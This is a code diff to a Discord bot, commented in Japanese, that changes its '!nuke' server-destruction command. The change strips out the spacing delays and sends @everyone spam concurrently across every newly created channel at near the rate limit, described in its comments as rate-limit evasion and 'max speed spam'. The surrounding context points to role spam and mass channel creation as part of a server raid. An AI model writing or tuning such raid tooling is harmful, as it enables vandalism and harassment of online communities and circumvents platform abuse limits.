@@ -104,6 +104,28 @@ async def get_server_data(ctx, server_id: int):
 # --- 💀 最終破壊機能 (!nuke コマンド) ---
 # ----------------------------------------------------
 
+# 🚨 レート制限回避のため、個々のメッセージ送信に短い遅延を挟むヘルパー関数を定義
+async def send_spam_message_with_delay(channel, content):
+    """チャンネルへのメッセージ送信を行い、極めて短いランダム遅延を挟む（レート制限対策）"""
+    try:
+        # チャンネルごとに0.1〜0.3秒の極めて短いランダム遅延を挟む
+        await asyncio.sleep(random.uniform(0.1, 0.3)) 
+        await channel.send(content)
+        return True
+    except discord.HTTPException as e:
+        # レート制限エラーを警告として記録するが、続行する
+        if e.status == 429:
+            logging.warning(f"チャンネル {channel.name} でレート制限に達したぜ (429)。")
+            # レート制限の場合は、少し長めに待機してからFalseを返す
+            await asyncio.sleep(random.uniform(3.0, 5.0))
+        else:
+            logging.error(f"チャンネル {channel.name} で予期せぬHTTPエラー: {e}")
+        return False
+    except Exception as e:
+        logging.error(f"チャンネル {channel.name} への送信中に予期せぬエラーが発生: {e}")
+        return False
+
+
 @bot.command(name="nuke") 
 @commands.has_permissions(administrator=True, manage_guild=True) 
 async def ultimate_nuke_command(ctx): 
@@ -193,7 +215,7 @@ async def ultimate_nuke_command(ctx):
         logging.error(f"ROLE SPAM ERROR: ロール作成中にエラーが発生したぜ。: {e}")
 
 
-    # 3. 全ての新しいチャンネルにスパムメッセージを15回送信 (ランダム遅延付き)
+    # 3. 全ての新しいチャンネルにスパムメッセージを15回、レート制限ギリギリで送信
     if successful_channels:
         spam_message_content = (
             "# @everyoneruru by nuke😂\n"
@@ -203,25 +225,25 @@ async def ultimate_nuke_command(ctx):
         )
         spam_count = 15
         
-        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**宣伝スパム**を送りつけるぞ！")
+        await successful_channels[0].send(f"📣 **MAX SPEED SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**レート制限ギリギリスパム**を送りつけるぞ！")
 
         
-        for i, channel in enumerate(successful_channels):
-            for j in range(spam_count):
-                try:
-                    await channel.send(spam_message_content)
-                    delay = random.uniform(1.0, 3.0)
-                    await asyncio.sleep(delay) 
-                    
-                except Exception as e:
-                    logging.warning(f"チャンネル {channel.name} ({i+1}/{len(successful_channels)}) へのメッセージ送信中にエラーが発生。中断するぜ: {e}")
-                    break
+        # 🚨 修正されたロジック: チャンネルを横断しながら、15回のラウンドを限界速度で実行
+        for j in range(spam_count):
+            spam_tasks = []
+            for channel in successful_channels:
+                # Botの処理限界まで、送信タスクを積み込む
+                spam_tasks.append(asyncio.create_task(send_spam_message_with_delay(channel, spam_message_content)))
+                
+            try:
+                # 全てのタスクが完了するのを待つ (レート制限でブロックされたら、send_spam_message_with_delay内で処理される)
+                await asyncio.gather(*spam_tasks)
+                
+            except Exception as e:
+                logging.warning(f"スパムラウンド {j+1}/{spam_count} の実行中にエラーが発生したぜ。: {e}")
             
-            if i < len(successful_channels) - 1:
-                channel_delay = random.uniform(3.0, 5.0)
-                logging.info(f"チャンネル {i+1} 完了。次のチャンネルへ移行するまで {channel_delay:.2f}秒待機。")
-                await asyncio.sleep(channel_delay)
-
+            # 各ラウンド間のインターバル (最低限の待機)
+            await asyncio.sleep(random.uniform(0.5, 1.0))
 
     # 4. 最終報告
     if successful_channels:
